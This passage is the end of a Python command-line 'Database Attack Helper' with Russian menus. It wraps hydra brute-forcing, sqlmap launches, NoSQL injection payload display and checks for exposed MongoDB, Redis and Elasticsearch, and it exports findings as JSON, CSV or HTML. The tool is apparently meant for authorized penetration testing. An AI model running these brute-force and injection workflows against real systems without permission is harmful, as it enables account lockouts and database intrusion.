    console.print(f"[cyan]$ {' '.join(cmd)}[/cyan]\n")
    console.print("[yellow]⚠ Brute-force может забанить учётки! "
                  "Убедись, что знаешь lockout policy.[/yellow]")
    if not Confirm.ask("Запустить?", default=False):
        return
    try:
        subprocess.run(cmd, check=False)
        db.save_scan("db_bruteforce", f"{service}:{target}", {})
    except KeyboardInterrupt:
        console.print("\n[yellow]Прервано.[/yellow]")


# ===========================================================================
# Экспорт
# ===========================================================================

def export_json(findings: list[DBFinding],
                 path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(DB_DIR / f"findings_{ts}.json")
    try:
        Path(path).write_text(
            json.dumps([asdict(f) for f in findings], indent=2,
                        ensure_ascii=False, default=str),
            encoding="utf-8")
        console.print(f"[green]✓ JSON: {path}[/green]")
        return Path(path)
    except Exception as exc:
        console.print(f"[red]JSON: {exc}[/red]")
        return None


def export_csv(findings: list[DBFinding],
                path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(DB_DIR / f"findings_{ts}.csv")
    cols = ["service", "target", "port", "severity",
            "evidence", "error", "remediation"]
    try:
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore")
            w.writeheader()
            for f_ in findings:
                w.writerow(asdict(f_))
        console.print(f"[green]✓ CSV: {path}[/green]")
        return Path(path)
    except Exception as exc:
        console.print(f"[red]CSV: {exc}[/red]")
        return None


def export_html(findings: list[DBFinding],
                 path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(DB_DIR / f"findings_{ts}.html")

    parts = [
        "<!DOCTYPE html><html lang='ru'><head><meta charset='utf-8'>",
        "<title>DB Attack Findings</title>",
        "<style>",
        "body{background:#0a0a0a;color:#c8c8c8;font-family:monospace;"
        "padding:24px;line-height:1.5;}",
        "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
        "table{width:100%;border-collapse:collapse;margin-top:12px;"
        "font-size:13px;}",
        "th{background:#111;color:#00ff9c;padding:8px;text-align:left;"
        "border:1px solid #222;}",
        "td{padding:6px 8px;border:1px solid #222;word-break:break-all;}",
        "tr:nth-child(even){background:#0d0d0d;}",
        ".critical{color:#ff2020;font-weight:bold;}",
        ".high{color:#ff7a40;font-weight:bold;}",
        ".medium{color:#ffd23f;}",
        ".low{color:#00ff9c;}",
        ".info{color:#7ad9ff;}",
        "</style></head><body>",
        f"<h1>🗄  DB Attack Findings ({len(findings)})</h1>",
        f"<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
        "<table><tr><th>Sev</th><th>Service</th><th>Target</th>"
        "<th>Port</th><th>Evidence</th><th>Remediation</th></tr>",
    ]
    for f in sorted(findings,
                    key=lambda x: {"critical": 0, "high": 1, "medium": 2,
                                    "low": 3, "info": 4}.get(x.severity, 5)):
        parts.append(
            f"<tr><td class='{f.severity}'>{f.severity.upper()}</td>"
            f"<td>{html_mod.escape(f.service)}</td>"
            f"<td>{html_mod.escape(f.target)}</td>"
            f"<td>{f.port}</td>"
            f"<td>{html_mod.escape(f.evidence[:200])}</td>"
            f"<td>{html_mod.escape(f.remediation[:150])}</td></tr>")
    parts.append("</table></body></html>")
    try:
        Path(path).write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ HTML: {path}[/green]")
        return Path(path)
    except Exception as exc:
        console.print(f"[red]HTML: {exc}[/red]")
        return None


# ===========================================================================
# CLI-обёртки (совместимы со старыми)
# ===========================================================================

def cli_scan(host: str) -> None:
    findings = scan_host(host)
    if findings and Confirm.ask("Экспорт JSON+HTML?", default=False):
        export_json(findings)
        export_html(findings)


def cli_mongo(host: str, port: int = 27017) -> None:
    r = check_mongodb(extract_host(host), port)
    if r:
        _print_finding(r)
        _save_finding(r)


def cli_redis(host: str, port: int = 6379) -> None:
    r = check_redis(extract_host(host), port)
    if r:
        _print_finding(r)
        _save_finding(r)


def cli_es(host: str, port: int = 9200) -> None:
    r = check_elasticsearch(extract_host(host), port)
    if r:
        _print_finding(r)
        _save_finding(r)


def cli_sqlmap(url: str, preset: str = "quick") -> None:
    sqlmap_launch(url, preset)


def cli_payloads(kind: str = "mongodb_auth_bypass") -> None:
    show_nosql_payloads(kind)


def cli_ports() -> None:
    t = Table(title=f"🗄  DB Ports ({len(DB_PORTS)})")
    t.add_column("Port", style="cyan", width=6)
    t.add_column("Service", style="green")
    for pt, name in sorted(DB_PORTS.items()):
        t.add_row(str(pt), name)
    console.print(t)


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🗄  Database Attack Helper[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Полный скан хоста (все DB-порты)"),
        ("2", "Только MongoDB"),
        ("3", "Только Redis"),
        ("4", "Только Elasticsearch"),
        ("5", "SQLMap launcher (9 пресетов)"),
        ("6", "NoSQL injection payloads"),
        ("7", "Brute-force через hydra"),
        ("8", "Список портов БД"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного пентеста.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        host = Prompt.ask("Хост/IP")
        findings = scan_host(host)
        if findings and Confirm.ask("Экспорт JSON + HTML?",
                                      default=False):
            export_json(findings)
            export_html(findings)
    elif c == "2":
        cli_mongo(Prompt.ask("Хост"))
    elif c == "3":
        cli_redis(Prompt.ask("Хост"))
    elif c == "4":
        cli_es(Prompt.ask("Хост"))
    elif c == "5":
        url = Prompt.ask("URL (с параметром)")
        preset = Prompt.ask("Пресет",
                             choices=list(SQLMAP_PRESETS.keys()),
                             default="quick")
        data = cookie = ""
        if preset in ("post", "json-api"):
            data = Prompt.ask("POST data")
        if preset == "cookie":
            cookie = Prompt.ask("Cookie")
        sqlmap_launch(url, preset, data, cookie)
    elif c == "6":
        kind = Prompt.ask("Тип", choices=list(NOSQL_PAYLOADS.keys()),
                          default="mongodb_auth_bypass")
        show_nosql_payloads(kind)
    elif c == "7":
        svc = Prompt.ask("Service",
                          choices=["mysql", "mssql", "postgres",
                                    "oracle", "mongodb", "redis", "ssh"],
                          default="mysql")
        target = Prompt.ask("Host")
        ul = Prompt.ask("Users file")
        pl = Prompt.ask("Passwords file")
        brute_force(svc, target, ul, pl)
    elif c == "8":
        cli_ports()